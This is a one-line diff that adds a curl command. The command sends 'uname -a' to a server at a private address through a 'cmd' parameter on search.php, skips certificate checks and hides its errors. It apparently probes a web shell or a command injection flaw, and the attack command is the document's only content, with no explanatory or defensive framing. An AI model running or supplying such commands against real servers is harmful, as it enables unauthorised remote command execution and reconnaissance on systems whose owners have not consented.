@@ -1,0 +1,1 @@
+curl --insecure "https://10.0.1.5/search.php?cmd=uname+-a" 2>/dev/null
